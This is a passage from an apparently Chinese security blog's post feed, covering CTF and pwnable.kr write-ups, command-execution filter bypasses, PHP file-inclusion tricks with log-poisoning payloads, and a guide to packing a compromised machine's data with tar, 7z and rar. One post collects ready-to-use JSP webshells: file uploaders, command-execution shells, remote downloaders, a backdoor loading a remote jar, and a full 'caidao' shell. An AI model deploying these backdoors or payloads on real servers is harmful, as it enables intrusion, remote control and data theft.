(isset($_GET[&apos;query&apos;])) &#123; $db = new SQLite3($SQL_DATABASE, SQLITE3_OPEN_READONLY); $qstr = SQLITE3::escapeString($_GET[&apos;query&apos;]); $query = &quot;SELECT amount FROM my_wallets WHERE id=$qstr&quot;; $result = $db-&gt;querySingle($query); if (!$result === NULL) &#123; echo &quot;Error - invalid query&quot;; &#125; else &#123; echo &quot;Wallet contains: $result&quot;; &#125; &#125; else &#123; echo &quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Admin Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Welcome to the admin panel!&lt;br /&gt;&lt;br /&gt;&lt;form name=&apos;input&apos; action=&apos;admin.php&apos; method=&apos;get&apos;&gt;Wallet ID: &lt;input type=&apos;text&apos; name=&apos;query&apos;&gt;&lt;input type=&apos;submit&apos; value=&apos;Submit Query&apos;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&quot;; &#125;&#125; else echo &quot;Sorry, not authorized.&quot;; 就扔给了xnianq。 给了我两个值auth=240610708; hsh=aaroZmOk;这里说一下两个值的由来。比较sha1((string)$hsh) == md5((string)$auth)，弱类型。两个都为0e开头的值就可以，之前也刚好做过这种题。接下来就是SQList。 使用sqlmap跑了一下，发现表是flag。然后就出了上面的python。 misc题misc200 knock 描述：韩琛截获了一张纸条，突然记起来窃听器记录到房间里有人敲桌子下载附件。题目让人很容易误会。然后xnianq给我说，两个附件中的数据数目是对得上的。看起来和栅栏有很大的关系，结果并不是，看着很有句子的样子。然后找相关的密码学只是，找到了单表密码（替换密码），并找到了在线解密 它这里并不需要去找密码表。会将所有的可能都打印出来。栅栏解密就可以得出。 总结：对于PHP来说，理解还得进一步的加深。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jsp 小后门]]></title>
    <url>%2F2017%2F03%2Fjsp%E5%B0%8F%E5%90%8E%E9%97%A8%2F</url>
    <content type="text"><![CDATA[总结整理一些jsp的马 上传下面是两款用于上传的。 JSP一句话1&lt;% if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes()); %&gt; base64 编码上传写入base64编码字符 服务端解码成正常文件，可用来绕过waf 、写二进制文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;%@ page import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot; contentType=&quot;text/html; charset=utf-8&quot;%&gt;&lt;%request.setCharacterEncoding(&quot;utf-8&quot;);String filePath = request.getParameter(&quot;filePath&quot;);String content = request.getParameter(&quot;content&quot;);String base64Flag = request.getParameter(&quot;base64&quot;);String msg = &quot;&quot;;if(content != null)&#123;try&#123;File file = new File(filePath);OutputStream os = new FileOutputStream(file);byte[] bytes = null;if(&quot;on&quot;.equals(base64Flag))&#123;bytes = new sun.misc.BASE64Decoder().decodeBuffer(content);&#125;else&#123;bytes = content.getBytes(&quot;utf-8&quot;);&#125;os.write(bytes);os.close();msg = &quot;success&quot;;&#125;catch(Exception e)&#123;msg = &quot;error&quot;;&#125;&#125;%&gt;&lt;font color=&quot;red&quot;&gt;&lt;%=msg%&gt;&lt;/font&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;filepath:&lt;/td&gt;&lt;td&gt;&lt;%=application.getRealPath(&quot;&quot;)%&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;savepath:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; size=&quot;60&quot; name=&quot;filePath&quot; value=&quot;&lt;%=application.getRealPath(&quot;/&quot;)+&quot;luan_shell.jsp&quot;%&gt;&quot;/&gt;&lt;input type=&quot;checkbox&quot; name=&quot;base64&quot;/&gt;base64 decode&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;top&quot;&gt;&lt;td&gt;content:&lt;/td&gt;&lt;td&gt;&lt;textarea rows=&quot;20&quot; cols=&quot;70&quot; name=&quot;content&quot;&gt;&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr align=&quot;right&quot;&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;save&quot;/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt; 园长blog上的因为每次要用到关于jsp的后门、都得跑去园长的博客去翻，所以就索性在这里整理一遍。 执行系统命令:1&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt; 请求：http://192.168.16.240:8080/Shell/cmd2.jsp?i=ls 执行之后不会有任何回显，用来反弹个 shell 很方便。 有回显带密码验证的:123456789101112&lt;% if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b,0,a)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125;%&gt; 请求：http://192.168.16.240:8080/Shell/cmd2.jsp?pwd=023&amp;i=ifconfig 下载远程文件(不用apache io utils的话没办法把inputstream转byte,所以很长…)12345678910&lt;% java.io.InputStream in = new java.net.URL(request.getParameter(&quot;u&quot;)).openStream(); byte[] b = new byte[1024]; java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream(); int a = -1; while ((a = in.read(b)) != -1) &#123; baos.write(b, 0, a); &#125; new java.io.FileOutputStream(request.getParameter(&quot;f&quot;)).write(baos.toByteArray());%&gt; 请求：http://192.168.16.240:8080/Shell/download.jsp?f=/wwwroot/1.png&amp;u=http://www.baidu.com/img/bdlogo.png 下载到web路径:12345678910&lt;% java.io.InputStream in = new java.net.URL(request.getParameter(&quot;u&quot;)).openStream(); byte[] b = new byte[1024]; java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream(); int a = -1; while ((a = in.read(b)) != -1) &#123; baos.write(b, 0, a); &#125; new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+&quot;/&quot;+ request.getParameter(&quot;f&quot;)).write(baos.toByteArray());%&gt; 请求：http://192.168.16.240:8080/Shell/download.jsp?f=1.png&amp;u=http://www.baidu.com/img/bdlogo.png 反射调用外部jar,完美后门如果嫌弃上面的后门功能太弱太陈旧可以试试这个：1&lt;%=Class.forName(&quot;Load&quot;,true,new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(request.getParameter(&quot;u&quot;))&#125;)).getMethods()[0].invoke(null, new Object[]&#123;request.getParameterMap()&#125;)%&gt; 请求：http://192.168.16.240:8080/Shell/reflect.jsp?u=http://javaweb.org/Cat.jar&amp;023=A 菜刀马1&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;&lt;%!String Pwd=&quot;023&quot;;String cs=&quot;UTF-8&quot;;String EC(String s)throws Exception&#123;return new String(s.getBytes(&quot;ISO-8859-1&quot;),cs);&#125;Connection GC(String s)throws Exception&#123;String[] x=s.trim().split(&quot;\r\n&quot;);Class.forName(x[0].trim());if(x[1].indexOf(&quot;jdbc:oracle&quot;)!=-1)&#123;return DriverManager.getConnection(x[1].trim()+&quot;:&quot;+x[4],x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);&#125;else&#123;Connection c=DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);if(x.length&gt;4)&#123;c.setCatalog(x[4]);&#125;return c;&#125;&#125;void AA(StringBuffer sb)throws Exception&#123;File r[]=File.listRoots();for(int i=0;i&lt;r.length;i++)&#123;sb.append(r[i].toString().substring(0,2));&#125;&#125;void BB(String s,StringBuffer sb)throws Exception&#123;File oF=new File(s),l[]=oF.listFiles();String sT,sQ,sF=&quot;&quot;;java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);for(int i=0; i&lt;l.length; i++)&#123;dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?&quot;R&quot;:&quot;&quot;;sQ +=l[i].canWrite()?&quot; W&quot;:&quot;&quot;;if(l[i].isDirectory())&#123;sb.append(l[i].getName()+&quot;/\t&quot;+sT+&quot;\t&quot;+l[i].length()+&quot;\t&quot;+sQ+&quot;\n&quot;);&#125;else&#123;sF+=l[i].getName()+&quot;\t&quot;+sT+&quot;\t&quot;+l[i].length()+&quot;\t&quot;+sQ+&quot;\n&quot;;&#125;&#125;sb.append(sF);&#125;void EE(String s)throws Exception&#123;File f=new File(s);if(f.isDirectory())&#123;File x[]=f.listFiles();for(int k=0; k &lt; x.length; k++)&#123;if(!x[k].delete())&#123;EE(x[k].getPath());&#125;&#125;&#125;f.delete();&#125;void FF(String s,HttpServletResponse r)throws Exception&#123;int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write((&quot;-&gt;&quot;+&quot;|&quot;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.write((&quot;|&quot;+&quot;&lt;-&quot;).getBytes(),0,3);os.close();is.close();&#125;void GG(String s,String d)throws Exception&#123;String h=&quot;0123456789ABCDEF&quot;;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0; i&lt;d.length();i+=2)&#123;os.write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d.charAt(i+1))));&#125;os.close();&#125;void HH(String s,String d)throws Exception&#123;File sf=new File(s),df=new File(d);if(sf.isDirectory())&#123;if(!df.exists())&#123;df.mkdir();&#125;File z[]=sf.listFiles();for(int j=0; j&lt;z.length; j++)&#123;HH(s+&quot;/&quot;+z[j].getName(),d+&quot;/&quot;+z[j].getName());&#125;&#125;else&#123;FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;is.close();os.close();&#125;&#125;void II(String s,String d)throws Exception&#123;File sf=new File(s),df=new File(d);sf.renameTo(df);&#125;void JJ(String s)throws Exception&#123;File f=new File(s);f.mkdir();&#125;void KK(String s,String t)throws Exception&#123;File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());&#125;void LL(String s,String d)throws Exception&#123;URL u=new URL(s);int n=0;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-1)&#123;os.write(b,0,n);&#125;os.close();is.close();h.disconnect();&#125;void MM(InputStream is,StringBuffer sb)throws Exception&#123;String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\r\n&quot;);&#125;&#125;void NN(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);ResultSet r=s.indexOf(&quot;jdbc:oracle&quot;)!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();while(r.next())&#123;sb.append(r.getString(1)+&quot;\t&quot;);&#125;r.close();c.close();&#125;void OO(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);String[] x=s.trim().split(&quot;\r\n&quot;);ResultSet r=c.getMetaData().getTables(null,s.indexOf(&quot;jdbc:oracle&quot;)!=-1?x.length&gt;5?x[5]:x[4]:null,&quot;%&quot;,new String[]&#123;&quot;TABLE&quot;&#125;);while(r.next())&#123;sb.append(r.getString(&quot;TABLE_NAME&quot;)+&quot;\t&quot;);&#125;r.close();c.close();&#125;void PP(String s,StringBuffer sb)throws Exception&#123;String[] x=s.trim().split(&quot;\r\n&quot;);Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(&quot;select * from &quot;+x[x.length-1]);ResultSetMetaData d=r.getMetaData();for(int i=1;i&lt;=d.getColumnCount();i++)&#123;sb.append(d.getColumnName(i)+&quot; (&quot;+d.getColumnTypeName(i)+&quot;)\t&quot;);&#125;r.close();m.close();c.close();&#125;void QQ(String cs,String s,String q,StringBuffer sb,String p)throws Exception&#123;Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try&#123;ResultSet r=m.executeQuery(q.indexOf(&quot;--f:&quot;)!=-1?q.substring(0,q.indexOf(&quot;--f:&quot;)):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(int i=1; i &lt;=n; i++)&#123;sb.append(d.getColumnName(i)+&quot;\t|\t&quot;);&#125;sb.append(&quot;\r\n&quot;);if(q.indexOf(&quot;--f:&quot;)!=-1)&#123;File file=new File(p);if(q.indexOf(&quot;-to:&quot;)==-1)&#123;file.mkdir();&#125;bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(&quot;-to:&quot;)!=-1?p.trim():p+q.substring(q.indexOf(&quot;--f:&quot;)+4,q.length()).trim()),true),cs));&#125;while(r.next())&#123;for(int i=1; i&lt;=n;i++)&#123;if(q.indexOf(&quot;--f:&quot;)!=-1)&#123;bw.write(r.getObject(i)+&quot;&quot;+&quot;\t&quot;);bw.flush();&#125;else&#123;sb.append(r.getObject(i)+&quot;&quot;+&quot;\t|\t&quot;);&#125;&#125;if(bw!=null)&#123;bw.newLine();&#125;sb.append(&quot;\r\n&quot;);&#125;r.close();if(bw!=null)&#123;bw.close();&#125;&#125;catch(Exception e)&#123;sb.append(&quot;Result\t|\t\r\n&quot;);try&#123;m.executeUpdate(q);sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);&#125;catch(Exception ee)&#123;sb.append(ee.toString()+&quot;\t|\t\r\n&quot;);&#125;&#125;m.close();c.close();&#125;%&gt;&lt;%cs=request.getParameter(&quot;z0&quot;)!=null?request.getParameter(&quot;z0&quot;)+&quot;&quot;:cs;response.setContentType(&quot;text/html&quot;);response.setCharacterEncoding(cs);StringBuffer sb=new StringBuffer(&quot;&quot;);try&#123;String Z=EC(request.getParameter(Pwd)+&quot;&quot;);String z1=EC(request.getParameter(&quot;z1&quot;)+&quot;&quot;);String z2=EC(request.getParameter(&quot;z2&quot;)+&quot;&quot;);sb.append(&quot;-&gt;&quot;+&quot;|&quot;);String s=request.getSession().getServletContext().getRealPath(&quot;/&quot;);if(Z.equals(&quot;A&quot;))&#123;sb.append(s+&quot;\t&quot;);if(!s.substring(0,1).equals(&quot;/&quot;))&#123;AA(sb);&#125;&#125;else if(Z.equals(&quot;B&quot;))&#123;BB(z1,sb);&#125;else if(Z.equals(&quot;C&quot;))&#123;String l=&quot;&quot;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\r\n&quot;);&#125;br.close();&#125;else if(Z.equals(&quot;D&quot;))&#123;BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;E&quot;))&#123;EE(z1);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;F&quot;))&#123;FF(z1,response);&#125;else if(Z.equals(&quot;G&quot;))&#123;GG(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;H&quot;))&#123;HH(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;I&quot;))&#123;II(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;J&quot;))&#123;JJ(z1);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;K&quot;))&#123;KK(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;L&quot;))&#123;LL(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;M&quot;))&#123;String[] c=&#123;z1.substring(2),z1.substring(0,2),z2&#125;;Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);&#125;else if(Z.equals(&quot;N&quot;))&#123;NN(z1,sb);&#125;else if(Z.equals(&quot;O&quot;))&#123;OO(z1,sb);&#125;else if(Z.equals(&quot;P&quot;))&#123;PP(z1,sb);&#125;else if(Z.equals(&quot;Q&quot;))&#123;QQ(cs,z1,z2,sb,z2.indexOf(&quot;-to:&quot;)!=-1?z2.substring(z2.indexOf(&quot;-to:&quot;)+4,z2.length()):s.replaceAll(&quot;\\\\&quot;,&quot;/&quot;)+&quot;images/&quot;);&#125;&#125;catch(Exception e)&#123;sb.append(&quot;ERROR&quot;+&quot;:// &quot;+e.toString());&#125;sb.append(&quot;|&quot;+&quot;&lt;-&quot;);out.print(sb.toString());%&gt;]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>后门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用目标系统现有工具快速打包目标机器数据]]></title>
    <url>%2F2017%2F03%2F%E5%88%A9%E7%94%A8%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E7%8E%B0%E6%9C%89%E5%B7%A5%E5%85%B7%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[几乎对所有渗透者来讲,初衷或者最终目的无非就是想对目标实施长期监控及数据落地。 在linux机器下的快速打包方式:利用 ‘tar’一般在部署系统时默认都会预先装上,其它还有很多其它的压缩工具,但这里就以最常用的为例。12345678--exclude 排除不打包的文件-c 创建文件-v 显示打包过程-f 指定要打包的文件-z 压缩-X 把要排除的文件名事先写到文件中然后指定它就可以排除多个了-C 解压到指定目录中-p 打包的时候保持原有文件属性 以 gunzip 格式压缩解压:123# find / -name &apos;*.php&apos; -type f | wc -l# tar zcf /tmp/phpfile.tar.gz `find / -name &apos;*.php&apos; -type f` 2&gt; /dev/null &amp;&amp; cd /tmp &amp;&amp; ls ./phpfile.tar.gz &amp;&amp; echo $? &amp;&amp; tar tf phpfile.tar.gz | wc -l 会带上原有的目录结构# tar xf phpfile.tar.gz -C ./ 解压 以 bzip 格式压缩解压:12# tar jcf access.tar.bz access* bzip格式打包压缩文件# tar jxf access.tar.bz zip解压缩 针对大文件的分卷压缩解压:123# tar cjf - /usr/local/apache2/htdocs/ | split -b 1m - www.bz2 2&gt;/dev/null 1m大小分割,直接压缩到当前目录下# cat www.bz2a* | tar xj 分割压缩后的解压方法# ls -lR usr/ 在win机器上的一些快速打包方式7z12345-r 递归压缩-o 指定要输出到的目录-p 指定密码-v 分卷压缩,给的务必要适量,否则文件会非常多a 添加压缩文件 普通压缩解压方式12# 7z.exe -r -padmin a c:\drupal754.7z C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*# 7z.exe x -padmin drupal754.7z -oc:\xl 分卷压缩解压方式12# 7z.exe -r -v1m -padmin a c:\drupal754.7z C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*# 7z.exe x -padmin drupal754.7z.001 -oc:\xl rar把安装好的winrar安装目录的rar.exe提取出来就可以直接用了,前提是你安装winrar的系统和目标的系统版本要对应,不然可能有些问题(自己觉得库应该是兼容的)123456-a 添加要压缩的文件-p 指定压缩密码-r 递归压缩,默认只压根目录,需要先注册下,把rarreg.key丢到安装winrar目录即可-x 指定要排除的文件,单位 k,m,g-v 分卷打包,后面跟上单位就好了,打包大文件会很有用-m3,4 使用较好的压缩方式,速度可能会有些慢 以 rar 格式压缩解压12# Rar.exe a -r -padmin -m3 -x*.txt -ta c:\drupal754.rar C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.* 把指定目录下的所有文件[包括所有子目录及子目录中的文件,排除txt文件]带密码压缩,然后把压缩好的文件放到c的根下命名成drupal754.rar# Rar.exe x -padmin c:\drupal754.rar c:\xl 带密码保留原有目录结构解压 以 zip 格式压缩解压[用法同上]12# Rar.exe a -r -padmin -m3 -x*.txt -ta c:\drupal754.zip C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*# Rar.exe x -padmin c:\drupal754.zip c:\xl 分卷压缩解压12# Rar.exe a -r -v1m -padmin -m3 -x*.txt -ta c:\drupal754.rar C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.* 压缩# Rar.exe x -padmin c:\drupal754.part01.rar c:\xl 解压 后话:很显然,通关全文,跟技术几乎没有任何关系[仅仅就是几个小工具的简单使用而已],就当留个备忘吧,留给有需要的朋友,另外,打包的时候务必注意下目标分区的大小,不然空间不够,容易出错,文件的元数据要不要一并保存,正在打包的文件是否被占用什么的,有时候打包可能还会有些小小的问题,相信那对你都不是问题]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>系统安全</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web狗的Pwnable]]></title>
    <url>%2F2017%2F01%2FWeb%E7%8B%97%E7%9A%84Pwnable%2F</url>
    <content type="text"><![CDATA[了解了解下pwn fd – 1 pt12345Mommy! what is a file descriptor in Linux? * try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://www.youtube.com/watch?v=blAxTfcW9VU ssh fd@pwnable.kr -p2222 (pw:guest) 主要的三个文件fd、fd.c、flag设置着不同的权限，fd是一个可执行文件，以下为fd.c的代码123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf(&quot;pass argv[1] a number\n&quot;); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123; printf(&quot;good job :)\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); &#125; printf(&quot;learn about Linux file IO\n&quot;); return 0;&#125; 因为初次接触linux C,所以对第五行的代码main中的参数进行详细查询。 int argc指执行程序时命令行的参数个数 argv[]数组用于存放命令行中参数的具体值 这道题如果键入的参数个数小于2个的话程序就会输出”pass argv[1] a number\n”让我们给第二个参数一个具体的数值.第十行描述的是通过 argv[1] 获取一字符串并使用 atoi() 函数将其转化为整型于 0x1234 （十进制的4660）作差，其结果赋值给整型变量 fd 。在linux C下read()函数是涉及到了文件描述的函数，这里指的是程序从 fd 文件描述符中读取32字节到 buf的内存中，并与字符串 LETMEWIN\n 进行比较，若相等则打印 flag 文件的内容，否则失败。 代码读到这里就卡住了，不知道从哪入手。接下来对题目进行了查询知道字符描述符的概要：每个Unix进程（除了可能的守护进程）应均有三个标准的POSIX文件描述符，对应于三个标准流： 整数值 名称 符号常量 文件流 0 Standard input STDIN_FILENO stdin 1 Standard output STDOUT_FILENO stdout 2 Standard error STDERR_FILENO stderr 在 Linux 系统下，文件描述符 0 ， 1 ， 2 分别对应系统的标准输入，标准输出，和标准错误输出。回到上面的代码中，当read函数对文件操作时，当fd为 0 时，我们可以控制标准输入向buf中写入数据。写一个 demo 来验证自己的想法：123456789101112#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123;int fd = atoi(argv[1]);int len = 0;len = read(fd, buf, 32);printf(&quot;&gt;&gt;&gt;buf:%s&quot;,&amp;buf);printf(&quot;&gt;&gt;&gt;len:%s\n&quot;,&amp;len);&#125; 结果为： 能证明想法是对的。此题可利用标准输入来将字符串 LETMEWIN\n 写到标准输入中，然后使得 fd 变量值为 0 即可从标注输入中读入，就可以得到flag。 collision – 3 pt1234Daddy told me about cool MD5 hash collision today.I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) 查看当前目录的col.c文件12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123;int* ip = (int*)p;int i;int res=0;for(i=0; i&lt;5; i++)&#123;res += ip[i];&#125;return res;&#125; int main(int argc, char* argv[])&#123;if(argc&lt;2)&#123;printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);return 0;&#125;if(strlen(argv[1]) != 20)&#123;printf(&quot;passcode length should be 20 bytes\n&quot;);return 0;&#125; if(hashcode == check_password( argv[1] ))&#123;system(&quot;/bin/cat flag&quot;);return 0;&#125;elseprintf(&quot;wrong passcode.\n&quot;);return 0;&#125; 题目描述md5碰撞。而第19行代码中的argv[1]可以知道密码的长度应该是20个字符。 从第三行中的check_password知道代码内将ip强制转化为int指针，而char占用1位，int4位，那么转化后就是5个数组，跟for循环也是吻合的，那么就是说char转化为int后加起来要等于0x21DD09EC 。意思就是说将输入的20个字符拆成5组数据，将5组数据的整型值相加与目标值 0x21DD09EC 进行比较，相等则打印 flag，不等则失败。此题直接将 0x21DD09EC 拆成5个数字的和即可，1+4的选择，通过 argv[1] 输入时，需要注意使用小端序。 bof – 5 pt1234567Nana told me that buffer overflow is one of the most common software vulnerability.Is that true? Download : http://pwnable.kr/bin/bofDownload : http://pwnable.kr/bin/bof.c Running at : nc pwnable.kr 9000 缓冲区溢出，老早就想了解溢出的东西了。将bof和源码下载下来，使用file查看，是32位的ELF 可执行文件，这种经常是在linux系统下进行调试的。 查看权限没有执行权限，给予相应的权限。]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令执行限制绕过]]></title>
    <url>%2F2017%2F01%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[原因：中关村在线命令执行 其中wooyun给的方案是使用*unix环境变量中的分隔符进行对空格的绕过。Linux 下： 如果存在命令执行限制，或者执行命令无显示，不妨这样试试在bash命令中，用赋值方式绕过。例如： 执行ls命令a=l;b=s;$a$b cat hello文件内容：1a=c;b=at;c=he;d=llo;$a$b $&amp;125;$&amp;125; 绕过空格12$&amp;125;cat$&amp;125;hello 或者在读取文件的时候利用重定向符12&lt;&gt;cat&lt;&gt;hello 利用CloudEye的DNSlog，中转记录。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含]]></title>
    <url>%2F2016%2F12%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%2F</url>
    <content type="text"><![CDATA[PHP是一种非常流行的Web开发语言，PHP的语法过于灵活，这也给安全工作者带来了一些困扰。同时，PHP也存在很多历史遗留的安全问题。 常见的导致文件包含的函数如下：12345PHP：include(),include_once(),require(),require_once(),fopen(),readfile(),... JSP/Servlet：ava.io.File(),java.io.FileReader(),... ASP：include file,include virtual,... 文件包含是PHP的一种常见用法，主要由4个函数完成：1234567include() require() include_once() require_once() 当使用这4个函数包含一个新的文件时，该文件将作为PHP代码执行，PHP内核并不会在意该被包含的文件是什么类型。所以如果被包含的是txt文件、图片、远程URL，也都将作为PHP代码执行。想要成功利用文件包含漏洞，需要满足下面两个条件：(1)include()等函数通过动态的方式引入需要包含的文件；(2)用户能够控制改动态变 本地文件包含常用技巧： 1、包含用户上传的文件。2、包含data://或php://input等伪协议。（allow_url_include设置为ON，PHP5.2.0后支持data:伪协议）3、包含Session文件。（条件比较苛刻，默认在/tem目录下）4、包含日志文件，比如Web Server的/etc/httpd/logs/access_log。（需要一定的读权限） 使用burpsuit抓包访问 ，绕过浏览器编码&lt;&gt;curl 访问不存在的url curl http://192.168.1.104/LFI/a.php?=&lt;?php phpinfo(); ?&gt; 访问：http://192.168.1.104/LFI/LFI.php?RcoIl=/etc/httpd/logs/access_log5、包含/proc/self/environ文件。6、包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析。 注意： 如果在不知道默认后缀是什么的时候，直接使用截断处理（%00） 包含日志时，要确认是否有读取access.log的权限，而且要确保在日志中存储的payload没有被转义。 可用php://filter/convert.base64-encode/resource=test.php读取php源码 远程文件包含如果php的配置选项allow_include为ON的话，则include/require函数是可以加载远程文件的。 注意： 1、远程包含时，不要包含远程的php文件，这样会当做是访问远程的php文件，而不是执行，建议是txt文件。2、一些经验丰富的开发者会考虑将被包含文件的扩展名写死，所以使用？进行截断。（不使用截断，就会提示找不到文件，不一样的系统，截断的方式不大一样） 测试： 理解了RFI攻击原理，防御也就简单了。在配置层面，保持PHP的默认设置，将“allow_url_include”关闭；在代码层面，如果一定要动态包含文件，最好明确规定包含哪些文件，进行白名单比对。同时，也可以在包含函数中加入目录限制。 本地测试环境：本地文件包含漏洞&amp;&amp;PHP利用协议&amp;&amp;实践源码 参考： 谈一谈php://filter的妙用LFI EXPLOITATION VIA PHP://INPUTBypassing PHP Null Byte Injection protections]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux提权总结]]></title>
